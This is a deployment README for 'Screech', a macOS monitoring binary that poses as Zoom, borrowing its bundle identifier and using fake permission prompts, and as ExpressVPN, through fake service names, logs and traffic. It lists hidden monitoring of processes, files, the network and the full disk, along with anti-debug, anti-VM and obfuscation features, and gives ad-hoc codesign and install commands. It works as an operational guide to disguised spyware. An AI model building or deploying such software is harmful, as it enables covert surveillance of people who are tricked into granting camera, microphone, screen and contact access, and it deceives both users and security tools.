# Screech macOS Deployment Package

## 🎯 Overview
This package contains a cross-compiled macOS ARM64 binary of Screech with advanced stealth capabilities:

- **Static Deception**: Zoom-style entitlements (appears as video conferencing app)
- **Runtime Deception**: ExpressVPN mimicry (network service identifiers and logging)
- **Stealth Logging**: Debug-only timestamped output via stealth logging system
- **Obfuscation**: Anti-debug, anti-VM, and code protection techniques

## 📦 Package Contents

```
deployment-package/
├── screech_zoom_mimicry        # Cross-compiled ARM64 binary
├── zoom_entitlements.plist     # Zoom-style entitlements with hidden monitoring
├── deploy_on_mac.sh           # Automated deployment script
└── README.md                  # This file
```

## 🚀 Quick Deployment

### Method 1: Automated Deployment (Recommended)
```bash
# Transfer the entire deployment-package folder to your Mac
# Then run:
cd deployment-package
./deploy_on_mac.sh
```

### Method 2: Manual Deployment
```bash
# 1. Code sign with Zoom entitlements
codesign --force --sign - --entitlements zoom_entitlements.plist screech_zoom_mimicry

# 2. Verify signature
codesign --verify --verbose=2 screech_zoom_mimicry

# 3. Make executable and rename
chmod +x screech_zoom_mimicry
cp screech_zoom_mimicry screech

# 4. Test execution
./screech
```

## 🔐 Entitlements Strategy

The binary uses **dual-layer deception**:

### Layer 1: Static Identity (Zoom Mimicry)
- Camera and microphone access (video conferencing)
- Screen sharing and recording capabilities  
- Contact and calendar access (meeting invitations)
- Location services (timezone scheduling)
- Keychain access with Zoom bundle identifier: `us.zoom.xos`

### Layer 2: Runtime Identity (ExpressVPN Mimicry)  
- Network service identifier: `com.expressvpn.networkextension`
- ExpressVPN-style logging: `[ExpressVPN Logger]` entries
- VPN server simulation and traffic generation
- Process name and network interface mimicry

## 🕵️ Stealth Features

### Monitoring Capabilities (Hidden)
- **Endpoint Security**: Process and file monitoring via ES framework
- **Network Extension**: Native macOS network monitoring
- **System Access**: Full disk access and system preferences
- **Audit Trail**: BSM audit system access
- **Memory Protection**: Code integrity and anti-hooking

### Anti-Analysis
- **Anti-Debug**: Debugger detection and evasion
- **Anti-VM**: Virtual machine detection
- **Code Obfuscation**: Function pointer obfuscation and polymorphic execution
- **Timing Randomization**: Execution timing obfuscation

## 🔧 System Requirements

- **macOS**: 11.0+ (Big Sur or later)
- **Architecture**: ARM64 (Apple Silicon)
- **Permissions**: May require manual approval in System Preferences

## 🧪 Testing & Verification

### 1. Basic Execution Test
```bash
./screech
# Should start with stealth logging output
```

### 2. VPN Mimicry Verification
```bash
# Check Console.app for ExpressVPN-style log entries:
# "[ExpressVPN Logger] ..." messages
```

### 3. Process Verification
```bash
# Check process list - should appear as legitimate process
ps aux | grep screech
```

### 4. Network Service Verification
```bash
# Check for ExpressVPN service identifier
lsof -i | grep screech
```

## 🔒 Required Permissions

The app may request the following permissions on first run:

### Visible (Zoom-style)
- **Camera**: "Zoom needs camera access for video calls"
- **Microphone**: "Zoom needs microphone access for audio"  
- **Screen Recording**: "Zoom needs screen access for sharing"
- **Contacts**: "Zoom needs contacts for meeting invitations"

### Hidden (Monitoring)
- **Full Disk Access**: For comprehensive file monitoring
- **Network Monitoring**: For traffic analysis
- **System Events**: For process monitoring

**Note**: Grant permissions as needed - the app will function with limited capabilities if some are denied.

## 🐛 Troubleshooting

### Code Signing Issues
```bash
# Re-sign if signature verification fails
codesign --force --sign - --entitlements zoom_entitlements.plist screech_zoom_mimicry
```

### Permission Denied
```bash
# Ensure executable permissions
chmod +x screech
```

### Missing Dependencies
```bash
# Check architecture compatibility
file screech
# Should show: "Mach-O 64-bit arm64 executable"
```

### Stealth Logging Not Visible
- Stealth logging only appears in **debug builds**
- In release builds, logs are suppressed for operational security
- Check Console.app for `[ExpressVPN Logger]` entries

## 📊 Monitoring Output

### Debug Mode (Stealth Logging)
```
[2024-07-28 19:30:15] Screech Unified Monitor v2.0 - macOS Build
[2024-07-28 19:30:15] Configuration: macOS with VPN Mimicry and Zoom Entitlements
[2024-07-28 19:30:15] ✓ Security engine initialized (Anti-Debug/Anti-VM)
[2024-07-28 19:30:15] ✓ VPN mimicry service initialized (ExpressVPN profile)
[2024-07-28 19:30:15] ✓ Process monitor started
[2024-07-28 19:30:15] ✓ File monitor started
```

### VPN Mimicry Logging
```
[ExpressVPN Logger] VPN Connected - Server: Netherlands - Amsterdam
[ExpressVPN Logger] Traffic metrics updated - 1.2MB sent, 3.4MB received
```

## 🔄 Updates & Maintenance

### Updating Entitlements
1. Modify `zoom_entitlements.plist`
2. Re-run deployment script: `./deploy_on_mac.sh`

### Changing VPN Mimicry Target
- Edit source code to change from ExpressVPN to another VPN provider
- Rebuild and redeploy

## ⚠️ Security Notes

1. **Operational Security**: Use only on authorized systems
2. **Permission Scope**: Grant minimal required permissions
3. **Log Management**: Monitor Console.app for unexpected entries
4. **Network Traffic**: VPN mimicry generates realistic but fake traffic
5. **Process Monitoring**: App monitors system activity - ensure compliance with local laws

## 📞 Support

For issues with the deployment or functionality:
1. Check Console.app for error messages
2. Verify code signature: `codesign --verify screech`
3. Test permissions in System Preferences > Security & Privacy
4. Review stealth logging output for diagnostic information

---
**Built**: Cross-compiled from Linux to macOS ARM64  
**Features**: Zoom Entitlements + ExpressVPN Mimicry + Stealth Logging  
**Version**: Screech v2.0 with Advanced Stealth Capabilities
